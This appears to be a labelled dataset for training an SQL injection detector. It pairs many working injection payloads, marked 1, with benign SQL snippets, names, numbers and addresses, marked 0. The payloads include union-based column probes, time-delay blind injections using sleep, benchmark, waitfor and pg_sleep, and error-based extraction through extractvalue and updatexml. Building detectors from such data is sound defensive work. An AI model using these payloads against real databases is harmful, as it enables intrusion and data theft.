Payload	Attacker
-8397'   )    )     )   or 2171  =  4788	1
1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--	1
SELECT MIN ( boy )  AS who FROM speech	0
SELECT numeral ( s )  FROM somewhere SELECT work FROM box	0
-4136'   )    )    as cczp where 7052  =  7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#	1
   SELECT COUNT ( for ) , you FROM lady BY especially	0
  SELECT Orders.opportunityrID, Employees.oxygen, Employees.heard FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.findID ORDER BY Orders.windowID	0
"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """	1
1' waitfor delay '0:0:5'--	1
-3597'   )    )    order by 1--	1
graupere trabucco	0
3600	0
DELETE FROM ring	0
"1%""   )    )    union all select null,null#"	1
SELECT * FROM act WHERE believed = 'judge'  OR come = 'rose'	0
" select * from users where id  =  1 or 1#""1 union select version  (    )  ,version  (    )   -- 1"	1
SELECT COUNT ( central ) FROM composed	0
-9393' where 3119  =  3119 or 8571  =  8571--	1
portugal 87,	0
" select * from users where id  =  1 or @#""{  =  1 or 1  =  1 -- 1"	1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   +'	1
1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv	1
1'  )   as khaa where 8157  =  8157 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #	1
"admin"" or 1  =  1--"	1
1 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # bzoq	1
derwin	0
8996000000000000	0
1%'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  '%'  =  '	1
9.97465E+015	0
" SELECT FIELD ( ""c"", ""a"", ""b"" ) ; "	0
SELECT Count ( * )  AS wet	0
SELECT nails ( s )  FROM sick LEFT JOIN	0
malott	0
6445	0
1858840000000000	0
maracaja@telogis.ad	0
SELECT shop ( s )  FROM front UNION	0
SELECT * FROM go WHERE riding NOT LIKE 'mill%'	0
trooger_gereighty@quierocortinas.mil	0
SELECT AVG ( cat )  FROM traffic  SELECT SUM ( percent ) 	0
SELECT TOP 50 PERCENT * FROM terrible SELECT * FROM film FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM view	0
sazarina_logue@gay-tantra.lc	0
1'  )   as bfgl where 8959  =  8959 union all select null,null,null,null,null,null,null,null,null,null--	1
12785855v	0
-6722'  )   order by 1#	1
SELECT * FROM badly WHERE won = 'red' FETCH FIRST 3 ROWS ONLY	0
  SELECT pond,row FROM native WHERE hold = 'threw' UNION SELECT buffalo, force FROM she	0
SELECT additional ( s )  FROM depend UNION	0
1'  )   where 1917  =  1917 union all select null#	1
1'||  (  select 'uqbj' from dual where 6736  =  6736 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
 SELECT o.OrderID, o.OrderDate, c.CustomerName FROM Customers AS c, Orders AS o WHERE c.CustomerName = 'Around the Horn' AND c.CustomerID = o.CustomerID;	0
 select * from users where id  =  '1' or   (  \  )    =  1 union select 1,@@VERSION -- 1'	1
SELECT * FROM office  WHERE equator NOT LIKE '[still]%'	0
SELECT * FROM lunch  WHERE him = joy	0
1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'ayjb' like 'ayjb	1
"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""ozvp""  =  ""ozvp"	1
nodonk@locuraporno.ar	0
"1""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""vhmc""  =  ""vhmc"	1
SELECT * FROM yourself  WHERE being = off	0
SELECT TOP 50 PERCENT * FROM sort SELECT * FROM wind FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM chief	0
c/ calzada 169	0
SELECT * FROM industry	0
  SELECT whereID AS ID, which AS passage FROM bill	0
SELECT * FROM brain WHERE activity NOT LIKE 'bush%'	0
"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly"	1
1'+  (  select 'aphz' where 1933  =  1933 union all select null,null,null,null,null,null#	1
22496795n	0
5349290000000000	0
a' or 1  =  1--	1
"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""uglh"" like ""uglh"	1
SELECT * FROM team WHERE saved = 'unless'	0
SELECT TOP 50 PERCENT * FROM settle SELECT * FROM blank FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM somehow	0
  SELECT garage,worse,it FROM breath LEFT JOIN Orders ON needs.lotID =  wagon.characteristic ORDER BY mouse.spent	0
1'||  (  select 'cqjw' from dual where 7335  =  7335 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'	1
SELECT COUNT ( direction ) FROM tongue	0
darrieu@redstarz.sv	0
"1""  )   as lipa where 3450  =  3450 and make_set  (  8403  =  8403,8899  )  --"	1
SELECT studied ( s )  FROM cat SELECT oil FROM composed	0
6140460000000000	0
1'1	1
"-7824""   )    )     )   union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--"	1
 SELECT * FROM change ORDER BY labor ASC, especially DESC	0
 UPDATE cost SET cat = 'discuss'WHERE today = 'dig'	0
SELECT * FROM dinner WHERE Price NOT BETWEEN 10 AND 20	0
1  )   as xwgf where 4204  =  4204 and sleep  (  5  )  --	1
1' rlike sleep  (  5  )   and 'gtfo'  =  'gtfo	1
1   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   5281  =  5281	1
"-8544%"" or 6872  =  6872 and ""%""  =  """	1
  SELECT massage,built,enemy FROM order LEFT JOIN Orders ON immediately.religiousID =  paragraph.although ORDER BY bee.desert	0
SELECT * FROM coal WHERE foot = 'above' FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM  ( SELECT prove FROM individual ) 	0
" select sleep  (  5  )   and    (    (   ""rthl"" like ""rthl"	1
1 where 5382  =  5382 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --	1
SELECT * FROM indicate WHERE establish = 'so'  OR gave = 'cheese'	0
"1"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""xqgt"" like ""xqgt"	1
scheifel2	0
5632	0
  SELECT ROUND ( 135.375, 2 ) ;	0
SELECT * FROM glass  WHERE sat = blanket	0
SELECT MIN ( size )  AS write FROM met	0
97428124d	0
"1"" where 9618  =  9618 and   (  3020  =  3020  )  *6703--"	1
16966742x	0
   SELECT prize, cold, lifeFROM tree WHERE throat  IS NOT NULL	0
corbo gornes	0
SELECT below ( s )  FROM station SELECT thank FROM knowledge	0
opaline	0
SELECT DISTINCT ice FROM cowboy	0
  UPDATE give SET alive =  'post', City =  'hunt' WHERE became =  lose	0
  SELECT * FROM brain WHERE cloud NOT IN  ( 'hardly', 'function', 'excellent' )  	0
"-6662""   )    )    union all select 6755--"	1
  SELECT fruitID AS ID, aware AS select FROM society	0
1'||  (  select 'bwqc' from dual where 6897  =  6897 and sleep  (  5  )  #	1
SELECT COUNT ( construction ) FROM gate	0
SELECT * FROM shelter	0
calle darsena san magin 198,	0
1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037	1
SELECT * FROM cream WHERE oxygen = 'person' LIMIT 3	0
SELECT TOP 3 * FROM straight WHERE soon = 'shinning' SELECT * FROM leave	0
SELECT interest FROM blow	0
1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'jmub'  =  'jmub	1
"1"" where 7045  =  7045"	1
coch soto	0
SELECT * FROM positive WHERE third = 'outline'	0
SELECT DISTINCT occasionally FROM wonder	0
INSERT INTO giving  ( rod, simplest, dot )  VALUES  ( 'court', 'badly', 'plain' )  	0
"1%""   )    )    union all select null,null--"	1
SELECT TOP 3 * FROM everyone SELECT * FROM music 3SELECT * FROM completely	0
des7768ab9e6os	0
"1%"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --"	1
SELECT * FROM cave WHERE card BETWEEN '1996-07-01' AND '1996-07-31'	0
1'   )    )    as tcby where 5213  =  5213	1
 select * from users where id  =  11<1# union select 1,version  (    )   -- 1	1
select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  '%'  =  '	1
1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '	1
SELECT * FROM capital	0
1' where 5060  =  5060	1
  SELECT * FROM hunt WHERE drew NOT IN  ( 'snake', 'hill', 'plural' )  	0
SELECT * FROM gate FETCH FIRST 50 PERCENT ROWS ONLY	0
adalino	0
7751	0
"1%""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --"	1
SELECT * FROM exercise WHERE raise = 'fact'  OR start = 'slip'	0
1'+  (  select gthp where 7311  =  7311 or sleep  (  5  )  #	1
SELECT * FROM anybody FETCH FIRST 3 ROWS ONLY	0
SELECT AVG ( Price ) FROM space	0
1%' or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --	1
"  SELECT TIME ( ""2017-08-15 19:30:10.000001"" ) ;"	0
 select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1	1
"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"	1
SELECT * FROM made WHERE group = 'crop' FETCH FIRST 3 ROWS ONLY	0
 UPDATE cave SET deal = 'needs'WHERE finger = 'sunlight'	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 348492 )  ORDER BY meta_id ASC	0
jorquera	0
enanzar	0
1'   )    )    union all select null,null#	1
"1%""  )   rlike   (  select   (  case when   (  7736  =  7642  )   then 1 else 0x28 end   )    )    and   (  ""%""  =  """	1
cantbrico	0
1' in boolean mode  )   and 5981  =  6700	1
1  )   where 4866  =  4866	1
   SELECT frighten, captain+ ', ' + further+ ' ' + slow+ ', ' + drive AS wrapped  FROM clock	0
vidrioso	0
1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'gmbd'  =  'gmbd	1
fischetti.bacall@players.com.gr	0
5861000000000000	0
jndula couttolenc	0
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'fnna'  =  'fnna	1
satandera	0
SELECT * FROM anybody WHERE struck NOT BETWEEN 'pull' AND 'rabbit'	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11510 )  ORDER BY meta_id ASC	0
SELECT COUNT ( border )  FROM support	0
SELECT COUNT ( darknessID ) FROM nodded	0
-5849  )   union all select 6168,6168,6168,6168,6168,6168,6168,6168#	1
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367582 ) 	0
"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb"	1
SELECT * FROM arm WHERE tongue = 'divide' FETCH FIRST 3 ROWS ONLY	0
1   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --	1
1'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'onmp'  =  'onmp	1
1' and 2908  =  8067--	1
SELECT * FROM lamp	0
select   (  case when   (  9562  =  5996  )   then 1 else 9562*  (  select 9562 from master..sysdatabases  )   end  )  --	1
1'   )    )    as zbkp where 1720  =  1720 and 4110  =  6748#	1
SELECT * FROM progress WHERE instrument = 'crack'  AND  ( freedom = 'something' OR pass = 'am' ) 	0
SELECT * FROM straight FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM travel	0
9ei91n	0
SELECT AVG ( window )  FROM simply  SELECT SUM ( thick ) 	0
9ig7a2i4	0
SELECT COUNT ( explore ) FROM having	0
SELECT COUNT ( money ) FROM center	0
pertusa boladera	0
1  )   as ezje where 5234  =  5234 and make_set  (  8403  =  8403,8899  )  --	1
SELECT * FROM brass WHERE straight = 'chemical'  AND City = 'recall'	0
verschuer_greenleaf@cajucar.cx	0
1'+  (  select 'fpnz' where 1592  =  1592 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'	1
1'+  (  select zmbu where 8685  =  8685 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  +'	1
1'  )   as njfg where 6392  =  6392 waitfor delay '0:0:5'--	1
atilio	0
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv	1
SELECT * FROM such WHERE fear = 'forget' LIMIT 3	0
1 where 7757  =  7757 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --	1
"-7482""   )    )     )   or 9077  =  2651"	1
SELECT power ( s )  FROM correctly	0
1'||  (  select 'hwdj' where 8179  =  8179	1
1626	0
nanclares espejo	0
eward	0
ferris	0
couri-manahan@copiar.com.fm	0
 UPDATE basic SET frozen = 'bean'WHERE examine = 'row'	0
SELECT * FROM simply WHERE settle = 'another'  AND City = 'nation'	0
SELECT COUNT ( divide ) FROM kill	0
declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) 	1
1 union all select null,null,null,null#	1
1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'eznq' like 'eznq	1
SELECT * FROM stuck WHERE gravity  BETWEEN 10 AND 20	0
"1""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""zyeo"" like ""zyeo"	1
1'  )   where 9538  =  9538	1
or 3  =  3 --	1
SELECT * FROM stopped WHERE of BETWEEN 'essential' AND 'raise'	0
SELECT * FROM inch FETCH FIRST 3 ROWS ONLY	0
SELECT Count ( * )  AS is	0
1%'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  '%'  =  '	1
6087	0
revesa	0
igzquiza	0
SELECT * FROM also WHERE pleasant  BETWEEN 10 AND 20	0
SELECT easy ( s )  FROM establish UNION	0
5240	0
"1%"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""%""  =  """	1
correch climent	0
4710000000000000	0
  SELECT typical,look,shells FROM below LEFT JOIN Orders ON border.moodID =  accurate.although ORDER BY studying.purpose	0
-3555'  )   or make_set  (  9354  =  9354,7185  )   and   (  'papr'  =  'papr	1
hallenbe	0
1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #	1
   SELECT observe, upward, screenFROM cool WHERE into  IS NOT NULL	0
1' where 2145  =  2145	1
   SELECT opposite, situation, foot FROM soft WHERE buffalo  IS NULL	0
SELECT * FROM giant FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM sure	0
" select * from users where id  =  1 or ""_;"" or 1  =  1 -- 1"	1
2144	0
boci+o	0
SELECT * FROM team WHERE subject = 'unknown'	0
1'   )    )    as uvxv where 6663  =  6663 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
"-5761""  )   or 3762  =  1274"	1
pl. heroes de espaa 20 11?g	0
"1""   )    )    as hiuf where 3277  =  3277 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --"	1
"1"" where 7290  =  7290 union all select null,null,null,null,null,null,null--"	1
  UPDATE road SET separate =  'particular', City =  'freedom' WHERE chapter =  favorite	0
yecla	0
SELECT smile FROM river	0
 SELECT * FROM cheese ORDER BY tone, personal	0
"-4291""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""xyhi""  =  ""xyhi"	1
SELECT * FROM slave ORDER BY wire	0
solania	0
SELECT * FROM are WHERE bush = 'particular'  OR metal = 'party'	0
6190000000000000	0
41217479f	0
SELECT location FROM choice	0
8691839999999999	0
   SELECT pick, thumb, vessels FROM horn WHERE wooden  IS NULL	0
SELECT * FROM think WHERE property BETWEEN kill09/01/1996flag AND yourself15/31/1996love	0
 SELECT * FROM recent ORDER BY swept, play	0
SELECT AVG ( ants ) FROM nothing SELECT SUM ( human ) 	0
INSERT INTO rays  ( fog, rising, tall )  VALUES  ( 'rule', 'grabbed', 'been' )  	0
1'+  (  select 'lcru' where 3215  =  3215	1
6590910000000000	0
SELECT private ( s )  FROM wing LEFT JOIN	0
select   (  case when   (  6204  =  1913  )   then 6204 else 6204*  (  select 6204 from information_schema.character_sets  )   end  )  #	1
rebes huasequi	0
SELECT AVG ( say ) FROM shirt SELECT SUM ( desert ) 	0
"1""  )   where 9680  =  9680 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --"	1
    SELECT column1, column2,...     FROM existing_table_name     WHERE ....; CREATE TABLE TestTable AS 	0
SELECT * FROM opposite ORDER BY rope DESC	0
SELECT TOP 3 * FROM coal	0
1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #	1
kazuo	0
1'||  (  select 'fzcu' where 9252  =  9252 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   ||'	1
